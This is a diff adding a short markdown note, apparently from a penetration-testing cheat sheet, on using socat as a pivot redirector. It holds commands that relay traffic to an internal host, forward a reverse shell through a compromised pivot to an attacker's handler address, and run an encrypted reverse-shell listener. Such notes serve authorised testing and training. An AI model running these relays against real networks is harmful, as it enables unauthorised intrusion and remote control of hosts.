@@ -1,0 +1,16 @@
+---
+title: "socat"
+---
+
+A dumb bidirectional relay — no SSH, no auth. Great as a **redirector** on a pivot, or to catch/forward a shell through one.
+
+```bash
+# relay: anything hitting the pivot's :8080 → forwarded to internal target :80
+socat TCP-LISTEN:8080,fork TCP:172.16.5.5:80
+# reverse-shell redirector: pivot listens :8080, forwards to YOUR handler :80
+socat TCP-LISTEN:8080,fork TCP:10.10.14.18:80
+# fully-encrypted reverse shell (attacker)
+socat -d -d OPENSSL-LISTEN:4443,cert=shell.pem,verify=0,fork STDOUT
+```
+
+<Tip>Use socat when you can't run SSH on the pivot but can drop a binary. Point your payload's `LHOST` at the pivot; socat relays it to your real listener.</Tip>
